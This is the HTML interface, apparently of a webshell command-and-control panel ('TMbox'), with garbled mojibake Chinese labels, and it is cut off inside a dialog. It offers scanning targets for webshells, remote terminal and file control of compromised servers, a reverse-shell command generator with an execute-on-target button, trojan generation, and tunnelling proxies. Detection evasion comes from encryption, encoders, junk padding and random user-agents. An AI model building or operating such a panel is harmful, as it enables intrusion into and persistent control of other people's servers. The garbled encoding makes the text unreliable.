<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TMbox - Webshell ç®¡ç†é¢æ¿ v2.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/socket.io/socket.io.js"></script>
    <script src="/webshell/crypto.js"></script>
    <script src="/webshell/protocol.js"></script>
    <script src="/webshell/terminal.js"></script>
    <script src="/webshell/filemanager.js"></script>
    <script src="/webshell/proxy.js"></script>
    <script src="/webshell/reverse.js"></script>
    <script src="/webshell/core.js"></script>
    <style>
        body { background-color: #0f172a; color: #e2e8f0; }
        .terminal-font { font-family: 'Consolas', 'Courier New', monospace; }
        .neon-pink { box-shadow: 0 0 10px #ec4899; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #1e293b; }
        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }
        .shell-card:hover { border-color: #ec4899; }
        .terminal-output { white-space: pre-wrap; word-break: break-all; }
        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
        .cursor-blink { animation: blink 1s infinite; }
        @keyframes pulse-green { 0%, 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.4); } 50% { box-shadow: 0 0 0 8px rgba(34, 197, 94, 0); } }
        .crypto-active { animation: pulse-green 2s infinite; }
        .crypto-badge { font-size: 9px; padding: 1px 4px; border-radius: 3px; }
    </style>
</head>
<body class="h-screen flex flex-col overflow-hidden">

    <!-- é¡¶éƒ¨å¯¼èˆª -->
    <header class="bg-slate-900 border-b border-pink-900/50 p-2 flex justify-between items-center shadow-lg z-10 shrink-0">
        <div class="flex items-center gap-3">
            <div class="w-3 h-3 rounded-full bg-pink-500 animate-pulse"></div>
            <h1 class="text-lg font-bold text-pink-500 tracking-wider">WEBSHELL <span class="text-slate-400">MANAGER v2.0</span></h1>
            <span id="shellStatus" class="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-500">æœªè¿æ¥</span>
            <span id="cryptoStatus" class="crypto-badge bg-slate-800 text-slate-500 hidden">
                <span id="cryptoIcon">ğŸ”“</span> <span id="cryptoText">æœªåŠ å¯†</span>
            </span>
        </div>
        <div class="flex gap-2 items-center">
            <button onclick="showImportModal()" class="text-xs bg-slate-700 hover:bg-slate-600 text-slate-300 px-3 py-1.5 rounded transition">
                å¯¼å…¥
            </button>
            <button onclick="exportShells()" class="text-xs bg-slate-700 hover:bg-slate-600 text-slate-300 px-3 py-1.5 rounded transition">
                å¯¼å‡º
            </button>
            <button onclick="showAddShellModal()" class="text-xs bg-pink-600 hover:bg-pink-700 text-white px-3 py-1.5 rounded transition">
                + æ·»åŠ  Shell
            </button>
            <button onclick="showGenerateShellModal()" class="text-xs bg-purple-600 hover:bg-purple-700 text-white px-3 py-1.5 rounded transition">
                ç”Ÿæˆæœ¨é©¬
            </button>
            <button onclick="window.location.href='/'" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded border border-slate-700 transition">
                â† è¿”å›ä¸»é¡µ
            </button>
        </div>
    </header>

    <!-- ä¸»è¦å†…å®¹ -->
    <div class="flex flex-1 overflow-hidden">

        <!-- å·¦ä¾§ï¼šShell åˆ—è¡¨ -->
        <div class="w-64 bg-slate-800 border-r border-slate-700 flex flex-col overflow-hidden shrink-0">
            <div class="p-2 border-b border-slate-700 flex justify-between items-center">
                <h3 class="text-xs font-bold text-slate-400">Shell åˆ—è¡¨</h3>
                <span id="shellCount" class="text-[10px] text-slate-500">0 ä¸ª</span>
            </div>
            <div id="shellList" class="flex-1 overflow-y-auto p-2 space-y-2">
                <div class="text-center text-slate-600 text-xs py-4">æš‚æ—  Shell</div>
            </div>
            <div class="p-2 border-t border-slate-700">
                <button onclick="batchTestAll()" class="w-full text-xs bg-slate-700 hover:bg-slate-600 text-slate-300 py-1.5 rounded">
                    æ‰¹é‡æµ‹è¯•è¿æ¥
                </button>
            </div>
        </div>

        <!-- ä¸­é—´ï¼šåŠŸèƒ½åŒºåŸŸ -->
        <div class="flex-1 flex flex-col overflow-hidden">

            <!-- Tab å¯¼èˆª -->
            <div class="flex bg-slate-900 border-b border-slate-700 text-xs">
                <button onclick="switchTab('scanner')" id="tab-scanner" class="px-4 py-2 font-bold text-pink-400 bg-slate-800 border-b-2 border-pink-500">ğŸ” æ‰«æ</button>
                <button onclick="switchTab('terminal')" id="tab-terminal" class="px-4 py-2 font-bold text-slate-400 hover:text-white">ç»ˆç«¯</button>
                <button onclick="switchTab('files')" id="tab-files" class="px-4 py-2 font-bold text-slate-400 hover:text-white">æ–‡ä»¶ç®¡ç†</button>
                <button onclick="switchTab('reverse')" id="tab-reverse" class="px-4 py-2 font-bold text-slate-400 hover:text-white">åå¼¹Shell</button>
                <button onclick="switchTab('proxy')" id="tab-proxy" class="px-4 py-2 font-bold text-slate-400 hover:text-white">ä»£ç†</button>
                <button onclick="switchTab('info')" id="tab-info" class="px-4 py-2 font-bold text-slate-400 hover:text-white">ä¿¡æ¯</button>
                <button onclick="switchTab('config')" id="tab-config" class="px-4 py-2 font-bold text-slate-400 hover:text-white">é…ç½®</button>
            </div>

            <!-- ä¼šè¯ä¿¡æ¯æ  -->
            <div id="sessionInfoBar" class="bg-slate-800/50 border-b border-slate-700 px-3 py-1 text-[10px] flex items-center gap-4 hidden">
                <span class="text-slate-500">Session: <span id="sessionId" class="text-cyan-400 font-mono">-</span></span>
                <span class="text-slate-500">Seq: <span id="sequenceNum" class="text-green-400 font-mono">0</span></span>
                <span class="text-slate-500">åŠ å¯†: <span id="encryptionType" class="text-yellow-400">AES-256-CBC</span></span>
                <span class="text-slate-500">UA: <span id="currentUA" class="text-purple-400 truncate max-w-[200px]">Random</span></span>
            </div>

            <!-- Tab å†…å®¹ -->
            <div class="flex-1 overflow-hidden relative">

                <!-- æ‰«æ Tab -->
                <div id="panel-scanner" class="absolute inset-0 flex flex-col bg-slate-900">
                    <!-- æ‰«æé…ç½® -->
                    <div class="p-3 bg-slate-800 border-b border-slate-700">
                        <h3 class="text-sm font-bold text-pink-400 mb-2">ğŸ” Webshell è‡ªåŠ¨æ‰«æå™¨</h3>

                        <div class="grid grid-cols-4 gap-2 mb-3">
                            <div class="col-span-2">
                                <label class="block text-[10px] text-slate-500 mb-1">ç›®æ ‡ç½‘å€</label>
                                <input type="text" id="scanTargetUrl" placeholder="http://target.com"
                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">æ‰«ææ¨¡å¼</label>
                                <select id="scanMode" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5">
                                    <option value="quick">å¿«é€Ÿæ‰«æ</option>
                                    <option value="deep">æ·±åº¦æ‰«æ</option>
                                    <option value="stealth">éšè”½æ‰«æ</option>
                                </select>
                            </div>
                            <div class="flex items-end gap-1">
                                <button onclick="startAutoScan()" id="startScanBtn" class="flex-1 bg-pink-600 hover:bg-pink-700 text-white text-xs py-1.5 rounded">å¼€å§‹æ‰«æ</button>
                                <button onclick="stopAutoScan()" id="stopScanBtn" class="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs py-1.5 rounded hidden">åœæ­¢</button>
                            </div>
                        </div>

                        <!-- æ‰«æé€‰é¡¹ -->
                        <div class="grid grid-cols-5 gap-2 text-[10px]">
                            <label class="flex items-center gap-1 text-slate-400">
                                <input type="checkbox" id="scanCommonPaths" checked class="rounded"> å¸¸è§è·¯å¾„
                            </label>
                            <label class="flex items-center gap-1 text-slate-400">
                                <input type="checkbox" id="scanBackup" checked class="rounded"> å¤‡ä»½æ–‡ä»¶
                            </label>
                            <label class="flex items-center gap-1 text-slate-400">
                                <input type="checkbox" id="scanUpload" checked class="rounded"> ä¸Šä¼ ç‚¹
                            </label>
                            <label class="flex items-center gap-1 text-slate-400">
                                <input type="checkbox" id="scanNuclei" class="rounded"> Nuclei
                            </label>
                            <label class="flex items-center gap-1 text-slate-400">
                                <input type="checkbox" id="scanFuzz" class="rounded"> ç›®å½•çˆ†ç ´
                            </label>
                        </div>
                    </div>

                    <!-- æ‰«æç»“æœ -->
                    <div class="flex-1 overflow-y-auto p-3">
                        <div class="grid grid-cols-2 gap-3">
                            <!-- æ‰«ææ—¥å¿— -->
                            <div>
                                <div class="flex justify-between items-center mb-2">
                                    <h4 class="text-xs font-bold text-slate-400">æ‰«ææ—¥å¿—</h4>
                                    <span id="scanProgress" class="text-[10px] text-slate-500">å°±ç»ª</span>
                                </div>
                                <div id="scanLogs" class="bg-slate-800 rounded p-2 h-64 overflow-y-auto font-mono text-xs space-y-1">
                                    <div class="text-slate-600">ç­‰å¾…å¼€å§‹æ‰«æ...</div>
                                </div>
                            </div>

                            <!-- å‘ç°çš„Webshell -->
                            <div>
                                <div class="flex justify-between items-center mb-2">
                                    <h4 class="text-xs font-bold text-green-400">å‘ç°çš„ Webshell</h4>
                                    <span id="foundShellCount" class="text-[10px] text-slate-500">0 ä¸ª</span>
                                </div>
                                <div id="foundShells" class="bg-slate-800 rounded p-2 h-64 overflow-y-auto space-y-2">
                                    <div class="text-slate-600 text-xs text-center py-8">æš‚æ— å‘ç°</div>
                                </div>
                            </div>
                        </div>

                        <!-- å¿«é€Ÿæ“ä½œ -->
                        <div class="mt-3 grid grid-cols-4 gap-2">
                            <button onclick="scanCommonWebshells()" class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs py-2 rounded">
                                ğŸ“ æ‰«æå¸¸è§è·¯å¾„
                            </button>
                            <button onclick="scanWithNuclei()" class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs py-2 rounded">
                                ğŸ”¬ Nuclei POC
                            </button>
                            <button onclick="fuzzDirectories()" class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs py-2 rounded">
                                ğŸ“‚ ç›®å½•çˆ†ç ´
                            </button>
                            <button onclick="testConnection()" class="bg-green-700 hover:bg-green-600 text-white text-xs py-2 rounded">
                                ğŸ”— æµ‹è¯•è¿æ¥
                            </button>
                        </div>
                    </div>

                    <!-- å‘ç°åå¿«é€Ÿè¿æ¥ -->
                    <div id="quickConnectPanel" class="hidden p-3 bg-slate-800 border-t border-pink-500">
                        <h4 class="text-xs font-bold text-pink-400 mb-2">å¿«é€Ÿè¿æ¥</h4>
                        <div class="grid grid-cols-5 gap-2">
                            <div class="col-span-2">
                                <input type="text" id="quickConnectUrl" placeholder="http://target.com/shell.php"
                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div>
                                <input type="text" id="quickConnectPassword" placeholder="å¯†ç "
                                       class="w-full bg-slate-900 text-yellow-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div>
                                <select id="quickConnectType" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5">
                                    <option value="auto">è‡ªåŠ¨æ£€æµ‹</option>
                                    <option value="php_eval">PHP Eval</option>
                                    <option value="behinder_php">å†°è PHP</option>
                                    <option value="antsword_php">èšå‰‘ PHP</option>
                                </select>
                            </div>
                            <button onclick="quickConnect()" class="bg-pink-600 hover:bg-pink-700 text-white text-xs py-1.5 rounded">
                                è¿æ¥
                            </button>
                        </div>
                    </div>
                </div>

                <!-- ç»ˆç«¯ Tab -->
                <div id="panel-terminal" class="absolute inset-0 flex flex-col bg-black">
                    <div id="terminalOutput" class="flex-1 overflow-y-auto p-3 terminal-font text-xs text-green-400 terminal-output"></div>
                    <div class="p-2 bg-slate-900 border-t border-slate-800 flex items-center gap-2">
                        <span id="terminalPrompt" class="text-pink-400 font-bold text-xs">$</span>
                        <input type="text" id="terminalInput"
                               class="bg-transparent border-none outline-none flex-1 text-slate-200 text-xs font-mono"
                               placeholder="è¾“å…¥å‘½ä»¤..." autocomplete="off">
                        <button onclick="executeTerminalCommand()" class="text-xs bg-pink-600 hover:bg-pink-700 text-white px-3 py-1 rounded">æ‰§è¡Œ</button>
                    </div>
                </div>

                <!-- æ–‡ä»¶ç®¡ç† Tab -->
                <div id="panel-files" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
                    <div class="p-2 bg-slate-800 border-b border-slate-700 flex items-center gap-2">
                        <button onclick="goToParentDir()" class="text-xs bg-slate-700 hover:bg-slate-600 px-2 py-1 rounded">â†‘ ä¸Šçº§</button>
                        <input type="text" id="currentPath" value="/"
                               class="flex-1 bg-slate-900 text-green-400 border border-slate-600 rounded px-2 py-1 text-xs font-mono">
                        <button onclick="refreshFileList()" class="text-xs bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded">åˆ·æ–°</button>
                        <button onclick="showUploadModal()" class="text-xs bg-green-600 hover:bg-green-700 px-2 py-1 rounded">ä¸Šä¼ </button>
                        <button onclick="showMkdirModal()" class="text-xs bg-purple-600 hover:bg-purple-700 px-2 py-1 rounded">æ–°å»ºç›®å½•</button>
                    </div>
                    <div id="fileList" class="flex-1 overflow-y-auto p-2">
                        <table class="w-full text-xs">
                            <thead class="bg-slate-800 sticky top-0">
                                <tr class="text-slate-500">
                                    <th class="p-2 text-left">åç§°</th>
                                    <th class="p-2 text-right w-20">å¤§å°</th>
                                    <th class="p-2 text-right w-32">ä¿®æ”¹æ—¶é—´</th>
                                    <th class="p-2 text-right w-16">æƒé™</th>
                                    <th class="p-2 text-center w-28">æ“ä½œ</th>
                                </tr>
                            </thead>
                            <tbody id="fileTableBody" class="text-slate-300">
                                <tr><td colspan="5" class="p-4 text-center text-slate-600">è¯·å…ˆè¿æ¥ Shell</td></tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- åå¼¹Shell Tab -->
                <div id="panel-reverse" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
                    <div class="p-3 bg-slate-800 border-b border-slate-700">
                        <h3 class="text-sm font-bold text-pink-400 mb-2">ç”Ÿæˆåå¼¹Shellå‘½ä»¤</h3>
                        <div class="grid grid-cols-4 gap-2 mb-3">
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">ç±»å‹</label>
                                <select id="reverseType" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5">
                                    <option value="bash">Bash TCP</option>
                                    <option value="bash_exec">Bash Exec</option>
                                    <option value="nc">Netcat</option>
                                    <option value="nc_fifo">Netcat FIFO</option>
                                    <option value="perl">Perl</option>
                                    <option value="python">Python 2</option>
                                    <option value="python3">Python 3</option>
                                    <option value="php">PHP</option>
                                    <option value="php_shell">PHP Shell</option>
                                    <option value="ruby">Ruby</option>
                                    <option value="java">Java</option>
                                    <option value="powershell">PowerShell</option>
                                    <option value="socat">Socat</option>
                                </select>
                            </div>
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">IP</label>
                                <input type="text" id="reverseIp" placeholder="192.168.1.100"
                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">ç«¯å£</label>
                                <input type="text" id="reversePort" value="4444"
                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div class="flex items-end">
                                <button onclick="generateReverseShell()" class="w-full bg-pink-600 hover:bg-pink-700 text-white text-xs py-1.5 rounded">ç”Ÿæˆ</button>
                            </div>
                        </div>
                        <div class="bg-slate-900 rounded p-2">
                            <div class="flex justify-between items-center mb-1">
                                <span class="text-[10px] text-slate-500">å‘½ä»¤:</span>
                                <button onclick="copyReverseCommand()" class="text-[10px] text-blue-400 hover:text-blue-300">å¤åˆ¶</button>
                            </div>
                            <code id="reverseCommand" class="text-xs text-green-400 block break-all">é€‰æ‹©ç±»å‹å¹¶è¾“å…¥ IP/ç«¯å£ç”Ÿæˆå‘½ä»¤</code>
                        </div>
                        <div class="mt-2 flex gap-2">
                            <button onclick="executeReverseShell()" class="text-xs bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded">åœ¨ç›®æ ‡æ‰§è¡Œ</button>
                            <button onclick="copyListenerCommand()" class="text-xs bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded">å¤åˆ¶ç›‘å¬å‘½ä»¤</button>
                        </div>
                    </div>
                    <div class="flex-1 overflow-y-auto p-3">
                        <h4 class="text-xs font-bold text-slate-400 mb-2">åå¼¹Shellå†å²</h4>
                        <div id="reverseHistory" class="space-y-2">
                            <div class="text-slate-600 text-xs text-center py-4">æš‚æ— è®°å½•</div>
                        </div>
                    </div>
                </div>

                <!-- ä»£ç† Tab -->
                <div id="panel-proxy" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
                    <div class="p-3 bg-slate-800 border-b border-slate-700">
                        <h3 class="text-sm font-bold text-cyan-400 mb-2">ğŸ”Œ TCP ä»£ç†éš§é“</h3>

                        <!-- ä»£ç†ç±»å‹é€‰æ‹© -->
                        <div class="flex gap-2 mb-3">
                            <button onclick="setProxyMode('forward')" id="proxyModeForward" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-cyan-600 text-white">ç«¯å£è½¬å‘</button>
                            <button onclick="setProxyMode('socks5')" id="proxyModeSocks5" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-slate-700 text-slate-300">SOCKS5</button>
                            <button onclick="setProxyMode('http')" id="proxyModeHttp" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-slate-700 text-slate-300">HTTPä»£ç†</button>
                            <button onclick="setProxyMode('single')" id="proxyModeSingle" class="proxy-mode-btn text-[10px] px-3 py-1 rounded bg-slate-700 text-slate-300">å•æ¬¡è¯·æ±‚</button>
                        </div>

                        <!-- ç«¯å£è½¬å‘é…ç½® -->
                        <div id="proxyForwardConfig" class="grid grid-cols-5 gap-2">
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">æœ¬åœ°ç›‘å¬ç«¯å£</label>
                                <input type="text" id="proxyLocalPort" value="1080"
                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">ç›®æ ‡ä¸»æœº</label>
                                <input type="text" id="proxyTargetHost" placeholder="127.0.0.1"
                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">ç›®æ ‡ç«¯å£</label>
                                <input type="text" id="proxyTargetPort" placeholder="3306"
                                       class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                            </div>
                            <div class="flex items-end">
                                <button onclick="startProxyForward()" id="startProxyBtn" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white text-xs py-1.5 rounded">å¯åŠ¨</button>
                            </div>
                            <div class="flex items-end">
                                <button onclick="stopProxyAction()" id="stopProxyBtn" class="w-full bg-red-600 hover:bg-red-700 text-white text-xs py-1.5 rounded hidden">åœæ­¢</button>
                            </div>
                        </div>

                        <!-- å•æ¬¡è¯·æ±‚é…ç½® -->
                        <div id="proxySingleConfig" class="hidden space-y-2">
                            <div class="grid grid-cols-4 gap-2">
                                <div>
                                    <label class="block text-[10px] text-slate-500 mb-1">ç›®æ ‡ä¸»æœº</label>
                                    <input type="text" id="singleProxyHost" placeholder="127.0.0.1"
                                           class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                                </div>
                                <div>
                                    <label class="block text-[10px] text-slate-500 mb-1">ç›®æ ‡ç«¯å£</label>
                                    <input type="text" id="singleProxyPort" placeholder="80"
                                           class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs">
                                </div>
                                <div class="col-span-2 flex items-end">
                                    <button onclick="sendSingleProxyRequest()" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white text-xs py-1.5 rounded">å‘é€è¯·æ±‚</button>
                                </div>
                            </div>
                            <div>
                                <label class="block text-[10px] text-slate-500 mb-1">è¯·æ±‚æ•°æ®</label>
                                <textarea id="singleProxyData" rows="2" placeholder="GET / HTTP/1.1&#10;Host: localhost"
                                          class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs font-mono"></textarea>
                            </div>
                        </div>

                        <!-- çŠ¶æ€æ˜¾ç¤º -->
                        <div id="proxyStatus" class="mt-2 text-[10px] text-slate-500 hidden">
                            <span class="text-green-400">â— è¿è¡Œä¸­</span> |
                            è¿æ¥: <span id="proxyConnections">0</span> |
                            å…¥ç«™: <span id="proxyBytesIn">0 B</span> |
                            å‡ºç«™: <span id="proxyBytesOut">0 B</span>
                        </div>
                    </div>

                    <!-- ä»£ç†æ—¥å¿—å’Œå“åº” -->
                    <div class="flex-1 overflow-y-auto p-3">
                        <div class="flex justify-between items-center mb-2">
                            <h4 class="text-xs font-bold text-slate-400">ä»£ç†æ—¥å¿—</h4>
                            <button onclick="clearProxyLogs()" class="text-[10px] text-slate-500 hover:text-slate-300">æ¸…ç©º</button>
                        </div>
                        <div id="proxyLogs" class="space-y-1 font-mono text-xs mb-4">
                            <div class="text-slate-600 text-center py-2">æš‚æ— æ—¥å¿—</div>
                        </div>
                        <div id="proxyResponseArea" class="hidden">
                            <h4 class="text-xs font-bold text-slate-400 mb-2">å“åº”</h4>
                            <pre id="proxyResponse" class="bg-slate-800 rounded p-2 text-xs text-green-400 overflow-x-auto max-h-64"></pre>
                        </div>
                    </div>
                </div>

                <!-- ä¿¡æ¯ Tab -->
                <div id="panel-info" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
                    <div class="p-3 bg-slate-800 border-b border-slate-700 flex justify-between items-center">
                        <h3 class="text-sm font-bold text-yellow-400">ç³»ç»Ÿä¿¡æ¯</h3>
                        <div class="flex gap-2">
                            <button onclick="refreshSystemInfo()" class="text-xs bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded">åˆ·æ–°</button>
                            <button onclick="downloadPhpInfo()" class="text-xs bg-purple-600 hover:bg-purple-700 text-white px-3 py-1 rounded">phpinfo</button>
                        </div>
                    </div>
                    <div class="flex-1 overflow-y-auto p-3">
                        <div id="systemInfo" class="space-y-2">
                            <div class="text-slate-600 text-xs text-center py-8">è¯·å…ˆè¿æ¥ Shell</div>
                        </div>
                    </div>
                </div>

                <!-- é…ç½® Tab -->
                <div id="panel-config" class="absolute inset-0 flex flex-col bg-slate-900 hidden">
                    <div class="p-3 bg-slate-800 border-b border-slate-700">
                        <h3 class="text-sm font-bold text-blue-400">Webshell é…ç½®</h3>
                    </div>
                    <div class="flex-1 overflow-y-auto p-3">
                        <div class="max-w-lg mx-auto space-y-4">
                            <!-- åŠ å¯†è®¾ç½® -->
                            <div class="bg-slate-800 rounded p-3">
                                <h4 class="text-xs font-bold text-pink-400 mb-3 flex items-center gap-2">
                                    ğŸ” åŠ å¯†è®¾ç½®
                                </h4>
                                <div class="space-y-3">
                                    <div class="flex items-center gap-2">
                                        <input type="checkbox" id="configEncryption" checked class="rounded">
                                        <label class="text-xs text-slate-400">å¯ç”¨ AES-256-CBC åŠ å¯†</label>
                                    </div>
                                    <div class="flex items-center gap-2">
                                        <input type="checkbox" id="configSign" class="rounded">
                                        <label class="text-xs text-slate-400">å¯ç”¨ç­¾å (é˜²é‡æ”¾æ”»å‡»)</label>
                                    </div>
                                    <div class="flex items-center gap-2">
                                        <input type="checkbox" id="configPadding" class="rounded">
                                        <label class="text-xs text-slate-400">HTTP å¡«å……åƒåœ¾æ•°æ®</label>
                                    </div>
                                </div>
                            </div>

                            <!-- ç¼–ç è®¾ç½® -->
                            <div class="bg-slate-800 rounded p-3">
                                <h4 class="text-xs font-bold text-cyan-400 mb-3">ğŸ“ ç¼–ç è®¾ç½®</h4>
                                <div class="space-y-3">
                                    <div>
                                        <label class="block text-xs text-slate-400 mb-1">ç¼–ç </label>
                                        <select id="configEncoding" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
                                            <option value="UTF-8">UTF-8</option>
                                            <option value="GBK">GBK</option>
                                            <option value="GB2312">GB2312</option>
                                        </select>
                                    </div>
                                    <div>
                                        <label class="block text-xs text-slate-400 mb-1">ç¼–ç å™¨</label>
                                        <select id="configEncoder" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
                                            <option value="none">æ— </option>
                                            <option value="base64">Base64</option>
                                            <option value="hex">Hex</option>
                                            <option value="xor">XOR</option>
                                        </select>
                                    </div>
                                    <div>
                                        <label class="block text-xs text-slate-400 mb-1">è§£ç å™¨</label>
                                        <select id="configDecoder" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
                                            <option value="none">æ— </option>
                                            <option value="base64">Base64</option>
                                            <option value="hex">Hex</option>
                                            <option value="auto">è‡ªåŠ¨æ£€æµ‹</option>
                                        </select>
                                    </div>
                                </div>
                            </div>

                            <!-- ç½‘ç»œè®¾ç½® -->
                            <div class="bg-slate-800 rounded p-3">
                                <h4 class="text-xs font-bold text-green-400 mb-3">ğŸŒ ç½‘ç»œè®¾ç½®</h4>
                                <div class="space-y-3">
                                    <div class="flex items-center gap-2">
                                        <input type="checkbox" id="configRandomUA" checked class="rounded">
                                        <label class="text-xs text-slate-400">éšæœº User-Agent</label>
                                    </div>
                                    <div>
                                        <label class="block text-xs text-slate-400 mb-1">è¶…æ—¶æ—¶é—´ (ms)</label>
                                        <input type="number" id="configTimeout" value="30000"
                                               class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-2">
                                    </div>
                                </div>
                            </div>

                            <button onclick="saveConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white text-xs py-2 rounded">ä¿å­˜é…ç½®</button>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- æ·»åŠ  Shell æ¨¡æ€æ¡† -->
    <div id="addShellModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden">
        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[450px]">
            <div class="p-3 border-b border-slate-700 flex justify-between items-center">
                <h3 class="text-sm font-bold text-pink-400">æ·»åŠ  Webshell</h3>
                <button onclick="hideAddShellModal()" class="text-slate-500 hover:text-white">&times;</button>
            </div>
            <div class="p-3 space-y-3">
                <div>
                    <label class="block text-xs text-slate-400 mb-1">åç§°</label>
                    <input type="text" id="shellName" placeholder="æˆ‘çš„ Shell"
                           class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs">
                </div>
                <div>
                    <label class="block text-xs text-slate-400 mb-1">URL</label>
                    <input type="text" id="shellUrl" placeholder="http://target.com/shell.php"
                           class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs">
                </div>
                <div>
                    <label class="block text-xs text-slate-400 mb-1">å¯†ç </label>
                    <input type="text" id="shellPassword" placeholder="cmd"
                           class="w-full bg-slate-900 text-yellow-400 border border-slate-600 rounded p-2 text-xs">
                </div>
                <div>
                    <label class="block text-xs text-slate-400 mb-1">ç±»å‹</label>
                    <select id="shellType" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs">
                        <optgroup label="ğŸŸ¢ PHP 8.x (æ¨è)">
                            <option value="php8_eval">PHP8 Eval (æ¨è)</option>
                            <option value="php8_system">PHP8 System</option>
                            <option value="php8_passthru">PHP8 Passthru</option>
                            <option value="php8_shell_exec">PHP8 Shell_Exec</option>
                            <option value="php8_proc_open">PHP8 Proc_Open</option>
                        </optgroup>
                        <optgroup label="ğŸŸ¡ PHP 7.x">
                            <option value="php7_assert">PHP7 Assert</option>
                            <option value="php7_create_function">PHP7 Create_Function</option>
                        </optgroup>
                        <optgroup label="ğŸ”µ PHP é€šç”¨">
                            <option value="php_base64">PHP Base64ç¼–ç </option>
                            <option value="php_concat">PHP å­—ç¬¦ä¸²æ‹¼æ¥</option>
                            <option value="php_callback_array">PHP array_map</option>
                            <option value="php_class_invoke">PHP __invoke</option>
                        </optgroup>
                        <optgroup label="å†°è (éœ€å¯¹åº”ç”Ÿæˆå™¨)">
                            <option value="behinder_php">å†°è PHP</option>
                            <option value="behinder_php_enhanced">å†°è PHP å¢å¼ºç‰ˆ</option>
                            <option value="behinder_jsp">å†°è JSP</option>
                            <option value="behinder_jsp_enhanced">å†°è JSP å¢å¼ºç‰ˆ</option>
                            <option value="behinder_aspx">å†°è ASPX</option>
                        </optgroup>
                        <optgroup label="èšå‰‘">
                            <option value="antsword_php">èšå‰‘ PHP</option>
                        </optgroup>
                        <optgroup label="ASP/ASPX">
                            <option value="asp_simple">ASP ä¸€å¥è¯</option>
                            <option value="asp_encode">ASP ç¼–ç æ‰§è¡Œ</option>
                            <option value="aspx_jscript">ASPX JScript</option>
                            <option value="aspx_csharp">ASPX C#</option>
                        </optgroup>
                        <optgroup label="JSP">
                            <option value="jsp_runtime">JSP Runtime</option>
                            <option value="jsp_processbuilder">JSP ProcessBuilder</option>
                        </optgroup>
                    </select>
                </div>
                <!-- åŠ å¯†é€‰é¡¹ -->
                <div class="bg-slate-900 rounded p-2 space-y-2">
                    <div class="flex items-center gap-2">
                        <input type="checkbox" id="shellEncryption" checked class="rounded">
                        <label class="text-xs text-slate-400">å¯ç”¨ AES-256-CBC åŠ å¯†</label>
                    </div>
                    <div class="flex items-center gap-2">
                        <input type="checkbox" id="shellSign" class="rounded">
                        <label class="text-xs text-slate-400">å¯ç”¨ç­¾åé˜²é‡æ”¾</label>
                    </div>
                    <div class="flex items-center gap-2">
                        <input type="checkbox" id="shellPadding" class="rounded">
                        <label class="text-xs text-slate-400">HTTP åƒåœ¾å¡«å……</label>
                    </div>
                </div>
            </div>
            <div class="p-3 border-t border-slate-700 flex gap-2">
